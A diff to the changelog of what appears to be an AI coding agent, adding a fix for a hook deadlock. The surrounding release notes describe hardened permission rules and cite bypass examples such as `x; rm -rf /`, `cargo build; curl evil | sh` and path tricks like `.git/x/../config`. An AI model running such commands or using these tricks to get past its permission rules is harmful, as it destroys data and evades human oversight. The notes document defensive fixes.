@@ -15,6 +15,7 @@
 - Fixed a hard deadlock where choosing a session in the resume picker (or `/undo`) while a turn was streaming locked the agent mutex held by the turn, freezing the UI permanently. Such agent-locking operations now wait until the turn finishes.
 - `run_shell` permission rules now consider the whole command, not just its first word: a `deny(rm:*)` rule still blocks `sudo rm`, `x; rm -rf /`, or `find . | rm`, and an `allow(cargo:*)` rule no longer auto-runs `cargo build; curl evil | sh` (it falls through to a prompt).
 - Path-glob permission rules now normalize the path first, so a `deny(.git/**)` can't be slipped past by `./.git/config`, `.git//config`, or `.git/x/../config`.
+- Fixed a hang where a hook that printed output before reading its stdin could deadlock the agent (the PostToolUse payload can exceed the OS pipe buffer). Hook stdout/stderr are now drained before the payload is written, and the write runs on its own task bounded by the timeout.
 
 ## 0.0.1-beta.4
 
